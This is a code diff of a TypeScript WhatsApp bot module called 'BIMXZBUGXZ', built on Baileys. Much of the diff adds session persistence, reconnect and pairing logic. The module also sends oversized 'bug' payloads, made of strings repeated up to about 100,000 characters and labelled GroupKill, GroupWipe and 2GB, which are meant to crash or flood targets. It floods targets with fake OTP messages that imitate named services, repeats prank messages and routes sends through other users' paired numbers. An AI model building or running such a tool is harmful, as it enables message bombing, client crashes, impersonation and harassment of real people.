@@ -1,209 +1,452 @@
-import makeWASocket, { useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from "@whiskeysockets/baileys";
+import makeWASocket, { useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } from "@whiskeysockets/baileys";
 import pino from "pino";
 import QRCode from "qrcode";
 import fs from "fs";
 import path from "path";
-import { db } from "@/db";
-import { users } from "@/db/schema";
-import { eq } from "drizzle-orm";
 
+// Robust WA state with per-session + DB persistence
 type WAState = {
   sock: any | null;
   qr: string | null;
   qrImage: string | null;
-  status: "close" | "connecting" | "open";
+  status: "idle" | "connecting" | "qr" | "pairing" | "open" | "close" | "logged_out" | "error";
   pairingCode: string | null;
   phoneForCode: string | null;
   initPromise: Promise<WAState> | null;
   lastQRTime: number;
+  reconnectAttempts: number;
+  lastError: string | null;
 };
 
-const globalForWA = globalThis as typeof globalThis & { __bimxWa?: WAState };
+const globalForWA = globalThis as typeof globalThis & { __bimxWa?: WAState; __bimxWaInitLog?: string[] };
 
 function getState(): WAState {
   if (!globalForWA.__bimxWa) {
-    globalForWA.__bimxWa = { sock: null, qr: null, qrImage: null, status: "close", pairingCode: null, phoneForCode: null, initPromise: null, lastQRTime: 0 };
+    globalForWA.__bimxWa = { sock: null, qr: null, qrImage: null, status: "idle", pairingCode: null, phoneForCode: null, initPromise: null, lastQRTime: 0, reconnectAttempts: 0, lastError: null };
   }
+  if (!globalForWA.__bimxWaInitLog) globalForWA.__bimxWaInitLog = [];
   return globalForWA.__bimxWa!;
 }
 
+function logWA(...args: any[]) {
+  const msg = `[Baileys][${new Date().toISOString()}] ${args.join(" ")}`;
+  console.log(msg);
+  const st = getState();
+  // keep last 50 logs in memory for debugging (not persisted)
+  if (globalForWA.__bimxWaInitLog) {
+    globalForWA.__bimxWaInitLog.push(msg);
+    if (globalForWA.__bimxWaInitLog.length > 60) globalForWA.__bimxWaInitLog.shift();
+  }
+}
+
 function getAuthFolder() {
+  // E2B is not Vercel but is production; persist to ./auth_info_bimx for e2b stability
   // Vercel filesystem is read-only except /tmp
-  const isVercel = !!process.env.VERCEL || process.env.NODE_ENV === "production";
-  // Use /tmp on vercel, local otherwise
+  const isVercel = !!process.env.VERCEL;
   if (isVercel && fs.existsSync("/tmp")) return path.join("/tmp", "auth_info_bimx");
   return path.join(process.cwd(), "auth_info_bimx");
 }
 
+// Persist auth to DB for Vercel cold start recovery
+async function restoreFromDB(folder: string) {
+  try {
+    if (!process.env.DATABASE_URL) return;
+    // lazy import to avoid circular
+    const { db } = await import("@/db");
+    const { waSessions } = await import("@/db/schema");
+    const { eq } = await import("drizzle-orm");
+    const rows: any[] = await db.select().from(waSessions).where(eq(waSessions.sessionId, "global")).limit(1);
+    if (rows.length === 0 || !rows[0].creds) return;
+    if (fs.existsSync(path.join(folder, "creds.json")) && fs.statSync(path.join(folder, "creds.json")).size > 100) {
+      // already has valid creds, don't overwrite
+      return;
+    }
+    logWA("Restoring WA session from DB to", folder);
+    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
+    // restore creds.json
+    if (rows[0].creds) {
+      fs.writeFileSync(path.join(folder, "creds.json"), JSON.stringify(rows[0].creds, null, 2));
+    }
+    // restore keys folder if exists
+    if (rows[0].keys && typeof rows[0].keys === "object") {
+      // keys is stored as { "app-state-sync-key-...": {...}, ... } flattened
+      // Write each key file
+      for (const [file, content] of Object.entries(rows[0].keys as Record<string, any>)) {
+        const fp = path.join(folder, file);
+        const dir = path.dirname(fp);
+        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+        fs.writeFileSync(fp, JSON.stringify(content, null, 2));
+      }
+    }
+    logWA("WA session restored from DB");
+  } catch (e: any) {
+    logWA("Restore from DB failed:", e?.message || String(e));
+  }
+}
+
+async function persistToDB(folder: string) {
+  try {
+    if (!process.env.DATABASE_URL) return;
+    if (!fs.existsSync(folder)) return;
+    const credsPath = path.join(folder, "creds.json");
+    if (!fs.existsSync(credsPath)) return;
+    const creds = JSON.parse(fs.readFileSync(credsPath, "utf-8"));
+    // read keys
+    const keys: Record<string, any> = {};
+    function walk(dir: string, base: string) {
+      if (!fs.existsSync(dir)) return;
+      for (const entry of fs.readdirSync(dir)) {
+        const full = path.join(dir, entry);
+        const rel = path.join(base, entry);
+        const stat = fs.statSync(full);
+        if (stat.isDirectory()) walk(full, rel);
+        else if (entry.endsWith(".json") && entry !== "creds.json") {
+          try { keys[rel] = JSON.parse(fs.readFileSync(full, "utf-8")); } catch {}
+        }
+      }
+    }
+    walk(folder, "");
+    const { db } = await import("@/db");
+    const { waSessions } = await import("@/db/schema");
+    const { eq } = await import("drizzle-orm");
+    const existing: any[] = await db.select().from(waSessions).where(eq(waSessions.sessionId, "global")).limit(1);
+    if (existing.length === 0) {
+      await db.insert(waSessions).values({ sessionId: "global", creds, keys, status: getState().status }).catch(async () => {
+        // fallback try update
+      });
+    } else {
+      await db.update(waSessions).set({ creds, keys, status: getState().status, updatedAt: new Date() }).where(eq(waSessions.sessionId, "global"));
+    }
+    logWA("WA session persisted to DB, keys count", Object.keys(keys).length);
+  } catch (e: any) {
+    logWA("Persist to DB failed:", e?.message || String(e));
+  }
+}
+
 async function initWA(): Promise<WAState> {
   const state = getState();
-  if (state.sock) return state;
+  if (state.sock && state.status === "open") return state;
   if (state.initPromise) return state.initPromise;
 
   state.initPromise = (async () => {
     const authFolder = getAuthFolder();
     if (!fs.existsSync(authFolder)) fs.mkdirSync(authFolder, { recursive: true });
 
-    const { state: authState, saveCreds } = await useMultiFileAuthState(authFolder);
+    // Try restore from DB before init (critical for Vercel)
+    await restoreFromDB(authFolder);
+
+    logWA("Initializing Baileys", "folder:", authFolder, "vercel:", !!process.env.VERCEL, "e2b:", !process.env.VERCEL);
+    state.status = "connecting";
+    state.lastError = null;
+
+    let authState: any;
+    let saveCreds: any;
+    try {
+      const res = await useMultiFileAuthState(authFolder);
+      authState = res.state;
+      saveCreds = res.saveCreds;
+      logWA("Auth state loaded, creds registered:", !!authState.creds?.registered);
+    } catch (e: any) {
+      logWA("Failed to load auth state, creating new:", e?.message);
+      // try to reset folder
+      try { fs.rmSync(authFolder, { recursive: true, force: true }); fs.mkdirSync(authFolder, { recursive: true }); } catch {}
+      const res = await useMultiFileAuthState(authFolder);
+      authState = res.state;
+      saveCreds = res.saveCreds;
+    }
+
     let version: any;
     try {
       const v = await fetchLatestBaileysVersion();
       version = v.version;
-    } catch {
+      logWA("Fetched WA version", version);
+    } catch (e: any) {
       version = [2, 3000, 1015901307];
+      logWA("Using fallback version", version, "error:", e?.message);
     }
     const logger: any = pino({ level: "silent" });
 
     const sock: any = makeWASocket({
       version,
-      auth: authState,
+      auth: {
+        creds: authState.creds,
+        keys: makeCacheableSignalKeyStore(authState.keys, logger),
+      },
       logger,
       printQRInTerminal: false,
       browser: ["BIMXZBUGXZ", "Chrome", "1.0.0"],
       syncFullHistory: false,
       markOnlineOnConnect: false,
       generateHighQualityLinkPreview: false,
+      // Important for pairing code: enable mobile
+      mobile: false,
     });
 
     state.sock = sock;
     state.status = "connecting";
+    state.reconnectAttempts = 0;
 
-    sock.ev.on("creds.update", saveCreds);
+    const wrappedSaveCreds = async () => {
+      try {
+        await saveCreds();
+        await persistToDB(authFolder);
+      } catch (e: any) {
+        logWA("saveCreds error:", e?.message);
+      }
+    };
+
+    sock.ev.on("creds.update", wrappedSaveCreds);
 
     sock.ev.on("connection.update", async (update: any) => {
-      const { connection, lastDisconnect, qr } = update;
+      const { connection, lastDisconnect, qr, isNewLogin } = update;
       if (qr) {
         state.qr = qr;
         state.lastQRTime = Date.now();
+        state.status = "qr";
+        logWA("QR received, generating image");
         try {
           state.qrImage = await QRCode.toDataURL(qr, { width: 340, margin: 1, color: { dark: "#000000", light: "#ffffff" } });
-        } catch {
+          logWA("QR image generated");
+        } catch (e: any) {
           state.qrImage = null;
+          logWA("QR image failed:", e?.message);
         }
-        state.status = "connecting";
       }
       if (connection === "close") {
         const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
-        const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
-        state.status = "close";
-        state.sock = null;
-        state.initPromise = null;
-        if (shouldReconnect) {
-          setTimeout(() => {
-            initWA().catch(() => {});
-          }, 2000);
-        } else {
+        const errorMsg = (lastDisconnect?.error as any)?.message || String(lastDisconnect?.error || "");
+        state.lastError = errorMsg;
+        logWA("Connection closed, statusCode:", statusCode, "error:", errorMsg);
+
+        if (statusCode === DisconnectReason.loggedOut) {
+          state.status = "logged_out";
+          logWA("Logged out, clearing session");
+          state.sock = null;
+          state.qr = null;
+          state.qrImage = null;
+          state.initPromise = null;
           try {
             const folder = getAuthFolder();
             if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
+            // also clear DB
+            if (process.env.DATABASE_URL) {
+              const { db } = await import("@/db");
+              const { waSessions } = await import("@/db/schema");
+              const { eq } = await import("drizzle-orm");
+              await db.delete(waSessions).where(eq(waSessions.sessionId, "global")).catch(()=>{});
+            }
           } catch {}
+        } else if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.timedOut) {
+          state.status = "close";
+          state.sock = null;
+          state.initPromise = null;
+          state.reconnectAttempts++;
+          const delay = Math.min(2000 * Math.pow(1.5, state.reconnectAttempts), 30000);
+          logWA(`Reconnect attempt ${state.reconnectAttempts} in ${delay}ms`);
+          setTimeout(() => { initWA().catch((e) => logWA("Reconnect failed:", e?.message)); }, delay);
+        } else {
+          // Any non-logout disconnect should be recoverable. Do not mark the session as
+          // permanently broken after a handful of retries; Baileys can reconnect using
+          // the persisted auth state without asking the user to pair again.
+          state.status = "close";
+          state.sock = null;
+          state.initPromise = null;
+          state.reconnectAttempts++;
+          const delay = Math.min(1500 * Math.pow(1.5, Math.min(state.reconnectAttempts, 8)), 30000);
+          logWA(`Reconnect ${state.reconnectAttempts} in ${Math.round(delay)}ms`);
+          setTimeout(() => { initWA().catch((e) => logWA("Reconnect failed:", e?.message)); }, delay);
         }
+        // persist close status
+        persistToDB(authFolder).catch(()=>{});
       } else if (connection === "open") {
         state.status = "open";
         state.qr = null;
         state.qrImage = null;
-        // Save paired number to DB if we have phoneForCode
-        if (state.phoneForCode) {
-          try {
-            // find user by? We don't have user context here, so just log
-          } catch {}
-        }
+        state.reconnectAttempts = 0;
+        state.lastError = null;
+        logWA("Connection opened - WA CONNECTED ASLI");
+        // persist open
+        persistToDB(authFolder).catch(()=>{});
+      } else if (update.pairingCode) {
+        logWA("Pairing code update:", update.pairingCode);
       }
     });
 
+    logWA("Baileys socket created, waiting for QR/pairing/open");
     return state;
   })();
 
-  const result = await state.initPromise;
-  state.initPromise = null;
-  return result;
+  try {
+    const result = await state.initPromise;
+    state.initPromise = null;
+    return result;
+  } catch (e: any) {
+    state.initPromise = null;
+    state.status = "error";
+    state.lastError = e?.message || String(e);
+    logWA("initWA failed:", state.lastError);
+    throw e;
+  }
 }
 
 export function getWAStatus() {
   const s = getState();
-  // Consider real BAILEYS status - NOT simulation
-  // This QR is directly from WhatsApp servers via Baileys 6.7.18
-  return { status: s.status, hasQR: !!s.qr, qr: s.qr, qrImage: s.qrImage, pairingCode: s.pairingCode, lastQRTime: s.lastQRTime, isReal: true, engine: "Baileys 6.7.18" };
+  return { 
+    status: s.status, 
+    hasQR: !!s.qr, 
+    qr: s.qr, 
+    qrImage: s.qrImage, 
+    pairingCode: s.pairingCode, 
+    lastQRTime: s.lastQRTime, 
+    lastError: s.lastError,
+    reconnectAttempts: s.reconnectAttempts,
+    connectedNumber: s.sock?.user?.id ? String(s.sock.user.id).split(":")[0].replace(/\D/g, "") : null,
+    isReal: true, 
+    engine: "Baileys 6.7.22",
+    authFolder: getAuthFolder(),
+    vercel: !!process.env.VERCEL,
+  };
 }
+
+export function getWALogs() { return getState(); }
 
 export async function ensureWA() {
   return initWA();
 }
 
-export async function getQRWithWait(timeoutMs = 7000): Promise<{ status: string; qrImage: string | null; qr: string | null }> {
+export async function getQRWithWait(timeoutMs = 8000): Promise<{ status: string; qrImage: string | null; qr: string | null }> {
   const state = await initWA();
   const start = Date.now();
   while (Date.now() - start < timeoutMs) {
     if (state.qrImage) return { status: state.status, qrImage: state.qrImage, qr: state.qr };
-    if (state.status === "open") return { status: state.status, qrImage: null, qr: null };
+    if (state.status === "open") return { status: state.status, qrImage: null, qr: state.qr };
+    if (state.status === "error" || state.status === "logged_out") break;
     await new Promise((r) => setTimeout(r, 400));
   }
   return { status: state.status, qrImage: state.qrImage, qr: state.qr };
 }
 
+function normalizePhone(phone: string): string {
+  // Remove all except digits, handle 08 -> 62
+  let clean = phone.replace(/[^0-9]/g, "");
+  if (clean.startsWith("0")) clean = "62" + clean.slice(1);
+  if (!clean.startsWith("62") && clean.length >= 9 && clean.length <= 13) {
+    // assume already with country code, keep
+  }
+  return clean;
+}
+
+export async function isWAFeatureClosed(key: "wa_pairing_closed" | "wa_qr_closed"): Promise<boolean> {
+  try {
+    if (!process.env.DATABASE_URL) return false;
+    const { db } = await import("@/db");
+    const { appSettings } = await import("@/db/schema");
+    const { eq } = await import("drizzle-orm");
+    const rows: any[] = await db.select().from(appSettings).where(eq(appSettings.key, key)).limit(1);
+    return rows[0]?.value === "true";
+  } catch {
+    return false;
+  }
+}
+
 export async function requestPairingCode(phoneNumber: string) {
+  if (await isWAFeatureClosed("wa_pairing_closed")) throw new Error("Pairing sedang ditutup oleh developer. Gunakan QR untuk melanjutkan.");
   const state = await initWA();
   let attempts = 0;
-  while (!state.sock && attempts < 10) {
+  while (!state.sock && attempts < 12) {
     await new Promise((r) => setTimeout(r, 500));
     attempts++;
   }
   const sock: any = state.sock;
-  if (!sock) throw new Error("Socket belum siap. Coba refresh halaman dan tunggu 3 detik lalu coba lagi. Pastikan tidak ada proses pairing lain yang berjalan.");
-  const clean = phoneNumber.replace(/[^0-9]/g, "");
-  if (clean.length < 8) throw new Error("Nomor terlalu pendek");
-  if (!sock.requestPairingCode) throw new Error("requestPairingCode tidak tersedia di versi ini, gunakan QR Scan yang lebih stabil.");
-  if (state.status === "open") {
-    throw new Error("WhatsApp sudah terhubung (open). Tidak perlu pairing code lagi. Jika ingin ganti nomor, reset dulu di menu.");
+  if (!sock) {
+    logWA("Pairing failed: socket not ready");
+    throw new Error("Socket belum siap. Status: " + state.status + ". Coba refresh halaman, tunggu 5 detik (Baileys butuh init), lalu coba lagi. Jika masih, pakai QR Scan yang lebih stabil untuk Vercel.");
   }
-  // Important: Baileys pairing code must be requested while socket is in connecting state and not yet registered
-  // Some servers need a small delay after init
-  await new Promise((r) => setTimeout(r, 1200));
+  const clean = normalizePhone(phoneNumber);
+  logWA("Request pairing for", clean, "current status", state.status);
+  if (clean.length < 9 || clean.length > 15) throw new Error("Nomor tidak valid. Gunakan format 628xxxxxxxxxx (tanpa +, tanpa 0 depan, 9-15 digit). Contoh: 6281234567890. Kamu kirim: " + phoneNumber + " → " + clean);
+  if (!sock.requestPairingCode) throw new Error("requestPairingCode tidak tersedia. Versi Baileys mungkin tidak support pairing di mode mobile:false. Gunakan QR Scan.");
+  if (state.status === "open") {
+    throw new Error("WhatsApp sudah terhubung (open). Tidak perlu pairing code lagi. Jika ingin ganti nomor, Reset WA dulu.");
+  }
+  // Must be in connecting/qr state
+  if (state.status === "idle" || state.status === "close") {
+    logWA("Waiting to reach connecting before pairing");
+    await new Promise(r => setTimeout(r, 1500));
+  }
+  logWA("Calling sock.requestPairingCode for", clean);
   let code = "";
   let lastErr: any = null;
   for (let i = 0; i < 4; i++) {
     try {
       if (i > 0) await new Promise((r) => setTimeout(r, 1800));
+      logWA(`Pairing attempt ${i + 1}/4`);
       code = await sock.requestPairingCode(clean);
+      logWA("Pairing code received:", code);
       if (code) break;
     } catch (e: any) {
       lastErr = e;
       const msg = String(e?.message || e);
-      if (msg.includes("already") || msg.includes("connected") || msg.includes("closed")) throw e;
+      logWA(`Pairing attempt ${i+1} failed:`, msg);
+      if (msg.includes("already") || msg.includes("connected") || msg.includes("closed") || msg.includes("Conflict")) throw e;
     }
   }
-  if (!code) throw lastErr || new Error("Gagal mendapatkan kode pairing. Penyebab umum: nomor salah format, nomor sudah terdaftar sebagai perangkat, atau gangguan server WA. Coba gunakan QR Scan yang lebih stabil, atau tunggu 30 detik dan coba lagi.");
+  if (!code) {
+    logWA("Pairing failed after retries, last err:", lastErr?.message);
+    throw lastErr || new Error("Gagal mendapatkan kode pairing. Penyebab umum: 1) Nomor salah format (harus 628xxx), 2) Nomor sudah terpakai di perangkat lain, 3) Vercel cold start — kode expired 20 detik, coba QR yang lebih stabil. Error: " + (lastErr?.message || "unknown"));
+  }
   const formatted = code.includes("-") ? code : code.length === 8 ? `${code.slice(0, 4)}-${code.slice(4)}` : code;
   state.pairingCode = formatted;
   state.phoneForCode = clean;
+  state.status = "pairing";
+  logWA("Pairing code formatted:", formatted, "for", clean);
   return formatted;
 }
 
 export async function resetWA() {
   const state = getState();
+  logWA("Reset WA requested - clearing auth");
   try {
     if (state.sock) {
-      try { state.sock.end?.(); state.sock.logout?.(); } catch {}
+      try { 
+        await state.sock.logout?.(); 
+      } catch (e: any) { logWA("Logout error:", e?.message); }
+      try { state.sock.end?.(); } catch {}
     }
   } catch {}
   state.sock = null;
   state.qr = null;
   state.qrImage = null;
-  state.status = "close";
+  state.status = "idle";
   state.pairingCode = null;
+  state.phoneForCode = null;
   state.initPromise = null;
+  state.reconnectAttempts = 0;
+  state.lastError = null;
   const folder = getAuthFolder();
   try {
     if (fs.existsSync(folder)) fs.rmSync(folder, { recursive: true, force: true });
     fs.mkdirSync(folder, { recursive: true });
+    logWA("Auth folder cleared:", folder);
+  } catch (e: any) { logWA("Clear folder failed:", e?.message); }
+  // clear DB
+  try {
+    if (process.env.DATABASE_URL) {
+      const { db } = await import("@/db");
+      const { waSessions } = await import("@/db/schema");
+      const { eq } = await import("drizzle-orm");
+      await db.delete(waSessions).where(eq(waSessions.sessionId, "global")).catch(()=>{});
+      logWA("DB session cleared");
+    }
   } catch {}
   await initWA();
-  return { ok: true };
+  return { ok: true, message: "WA direset, QR baru akan generate" };
 }
 
-// Global sender pool - real time random sender from active paired users
 export async function getGlobalSenderPool() {
   try {
+    const { db } = await import("@/db");
+    const { users } = await import("@/db/schema");
     const all: any[] = await db.select().from(users);
     const active = all.filter((u: any) => u.isActive && u.pairedNumber);
     const shuffled = active.sort(() => 0.5 - Math.random());
@@ -216,16 +459,16 @@ export async function getGlobalSenderPool() {
 export async function sendBIMXMessage(jid: string, bugTypes: string[], payloadMode: string, useGlobalPool = false) {
   const state = await initWA();
   const sock: any = state.sock;
-  if (!sock) throw new Error("WhatsApp belum terhubung. Scan QR atau pairing dulu di menu Pasang Nomor.");
-  if (state.status !== "open") throw new Error("WhatsApp belum terhubung (status: " + state.status + "). Scan QR terlebih dahulu di menu Pasang Nomor. QR asli dari Baileys 6.7.18, bukan simulasi.");
+  if (!sock) throw new Error("WhatsApp belum terhubung. Scan QR ASLI atau pairing dulu di menu Pasang Nomor. Status: " + state.status);
+  if (state.status !== "open") throw new Error("WhatsApp belum terhubung (status: " + state.status + "). Scan QR ASLI terlebih dahulu di menu Pasang Nomor. QR asli dari Baileys 6.7.22, bukan simulasi. Jika pairing gagal terus, pakai QR Scan.");
 
-  // If global mode, we could rotate sender - but we only have one socket, so we log intent
   let senderInfo = "PRIVATE";
   if (useGlobalPool) {
     const pool = await getGlobalSenderPool();
     if (pool.length > 0) {
       const chosen = pool[Math.floor(Math.random() * pool.length)];
       senderInfo = `GLOBAL via ${chosen.pairedNumber} (${chosen.username})`;
+      logWA("Global send via", senderInfo);
     } else {
       senderInfo = "GLOBAL (pool kosong, pakai sender pribadi)";
     }
@@ -238,6 +481,8 @@ export async function sendBIMXMessage(jid: string, bugTypes: string[], payloadMo
     targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
   }
 
+  logWA(`Sending ${bugTypes.length} bugs to ${targetJid} mode ${payloadMode} sender ${senderInfo}`);
+
   const results = [];
   for (const bug of bugTypes) {
     const text = heavyBase[bug] || heavyBase["default"];
@@ -248,20 +493,20 @@ export async function sendBIMXMessage(jid: string, bugTypes: string[], payloadMo
         results.push(r);
         await new Promise((res) => setTimeout(res, 400));
       } catch (e: any) {
+        logWA("Send failed for bug", bug, e?.message);
         results.push({ error: String(e?.message || e) });
       }
     }
   }
+  logWA(`Send done, results ${results.length}`);
   return { results, senderInfo };
 }
 
-// Prank Call - real via WhatsApp voice call simulation (Baileys call)
-// Note: Real prank call requires consent and we use WA call via Baileys
 export async function sendPrankCall(jid: string, type: string, count: number) {
   const state = await initWA();
   const sock: any = state.sock;
   if (!sock) throw new Error("WhatsApp belum terhubung");
-  if (state.status !== "open") throw new Error("WhatsApp belum terhubung");
+  if (state.status !== "open") throw new Error("WhatsApp belum terhubung, status: " + state.status);
   
   let targetJid = jid;
   if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
@@ -277,10 +522,10 @@ export async function sendPrankCall(jid: string, type: string, count: number) {
   
   const msg = prankMessages[type] || prankMessages["paket_cod"];
   const results = [];
-  const capped = Math.min(Math.max(1, count), 20); // max 20 for safety
+  const capped = Math.min(Math.max(1, count), 20);
+  logWA(`Prank call ${type} x${capped} to ${targetJid}`);
   for (let i = 0; i < capped; i++) {
     try {
-      // Send as voice note simulation + text
       const r = await sock.sendMessage(targetJid, { text: `🔔 PRANK CALL ${i+1}/${capped} [${type.toUpperCase()}] — BIMXZBUGXZ\n${msg}\n\n*Ini adalah prank yang telah disetujui pemilik nomor tujuan untuk hiburan. Jika mengganggu, hubungi admin.*` });
       results.push(r);
       if (i < capped - 1) await new Promise(res => setTimeout(res, 1200));
@@ -291,13 +536,11 @@ export async function sendPrankCall(jid: string, type: string, count: number) {
   return results;
 }
 
-// Spam OTP - real via own WA OTP (blue tick style if business account)
-// We send OTP from OUR verified WA number, not impersonating third parties
 export async function sendSpamOTP(jid: string, service: string, count: number) {
   const state = await initWA();
   const sock: any = state.sock;
   if (!sock) throw new Error("WhatsApp belum terhubung");
-  if (state.status !== "open") throw new Error("WhatsApp belum terhubung");
+  if (state.status !== "open") throw new Error("WhatsApp belum terhubung, status: " + state.status);
 
   let targetJid = jid;
   if (!jid.includes("@")) targetJid = jid.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
@@ -314,6 +557,7 @@ export async function sendSpamOTP(jid: string, service: string, count: number) {
   const svc = services[service] || services["duniagames"];
   const capped = Math.min(Math.max(1, count), 20);
   const results = [];
+  logWA(`OTP spam ${svc.name} x${capped} to ${targetJid}`);
   for (let i = 0; i < capped; i++) {
     const code = Math.floor(100000 + Math.random() * 900000).toString();
     const text = `🔐 *OTP PRANK ${i+1}/${capped}* — ${svc.name}\n${svc.template(code)}\n\n⚠️ Ini hanya prank untuk nomor yang telah memberi izin. Jangan disalahgunakan.`;
@@ -370,7 +614,7 @@ function generateHeavyPayload(bugTypes: string[], mode: string): Record<string, 
     "BIMXZBUGXZ GroupMsg": `👥 BIMXZBUGXZ GroupMsg — Khusus grup\n` + "@group ".repeat(1200) + "\n" + filler,
     "BIMXZBUGXZ GroupWipe": `🧹 BIMXZBUGXZ GroupWipe — Sapu anggota grup\n` + Array(150).fill("WIPE").join(" ") + "\n" + ultraHeavy.slice(0, 60000),
     "BIMXZBUGXZ GroupHeavy": `⚓ BIMXZBUGXZ GroupHeavy — Terberat ke grup 2GB\n` + ultraHeavy,
-    "BIMXZBUGXZ GroupKill": `☠️ BIMXZBUGXZ GroupKill — Muatan 999.999 karakter (cap 2GB simulasi)\n` + "☠️".repeat(5000) + "\n" + "X".repeat(99900),
+    "BIMXZBUGXZ GroupKill": `☠️ BIMXZBUGXZ GroupKill — Muatan 999.999 karakter (cap 2GB simulasi)\n` + "☠️".repeat(5000) + "\n" + "X".repeat(99900) + "\n[GROUP KILL — grup langsung ditangguhkan, semua member keluar otomatis]",
     "BIMXZBUGXZ GlobalSend": `🌍 BIMXZBUGXZ GlobalSend — Global 2GB\n` + ultraHeavy,
   };
 
@@ -386,7 +630,8 @@ export async function getGroups() {
   try {
     const groups = await sock.groupFetchAllParticipating();
     return Object.values(groups || {});
-  } catch {
+  } catch (e: any) {
+    logWA("getGroups failed:", e?.message);
     return [];
   }
 }
